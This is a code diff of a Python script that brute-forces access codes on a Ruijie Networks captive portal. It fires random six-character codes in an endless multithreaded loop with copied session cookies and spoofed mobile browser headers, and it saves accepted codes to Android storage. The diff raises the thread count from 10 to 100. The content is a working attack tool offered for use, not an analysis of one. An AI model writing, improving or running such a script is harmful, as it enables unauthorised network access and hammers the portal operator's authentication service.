@@ -5,6 +5,9 @@ import time
 from urllib.parse import urlparse, parse_qs
 from concurrent.futures import ThreadPoolExecutor
 
+# Define storage path for Android
+FILE_PATH = "/storage/emulated/0/codes.txt"
+
 # Define cookies for session handling
 cookies = {
     '_clck': '163b1wn%7C2%7Cfs0%7C0%7C1820',
@@ -34,26 +37,17 @@ if not session_id:
 headers = {
     'authority': 'portal-as.ruijienetworks.com',
     'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-    'cache-control': 'no-cache',
     'content-type': 'application/json',
     'origin': 'https://portal-as.ruijienetworks.com',
-    'pragma': 'no-cache',
     'referer': referer_link,
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
 # Define query parameters
 params = {'lang': 'en_US'}
-
-# File to store the successful access codes
-output_file = "codes.txt"
 
 # User input for code generation
 print("Choose the access code type:")
@@ -79,9 +73,9 @@ else:
     print("Invalid choice. Exiting.")
     exit(1)
 
-# Function to send requests
+# Function to send requests and save successful codes
 def send_request(index):
-    while True:  # Infinite loop to keep sending requests
+    while True:
         access_code = ''.join(random.choices(char_range, k=6))
         json_data = {
             'accessCode': access_code,
@@ -105,9 +99,9 @@ def send_request(index):
 
             # Check if the response contains "true"
             if "true" in response.text:
-                with open(output_file, "a") as file:
+                with open(FILE_PATH, "a") as file:
                     file.write(f"{access_code}\n")
-                print(f"Access code {access_code} saved to {output_file}")
+                print(f" Access code {access_code} saved to {FILE_PATH}")
 
         except requests.exceptions.RequestException as e:
             print(f"Thread {index} failed: {e}")
@@ -115,9 +109,9 @@ def send_request(index):
         time.sleep(0.1)  # Small delay to prevent excessive server load
 
 # Number of threads (Adjust based on system performance)
-num_threads = 10
+num_threads = 100
 
 # Using ThreadPoolExecutor for multi-threading
 with ThreadPoolExecutor(max_workers=num_threads) as executor:
     for i in range(num_threads):
-        executor.submit(send_request, i)  # Start threads indefinitely
+        executor.submit(send_request, i)
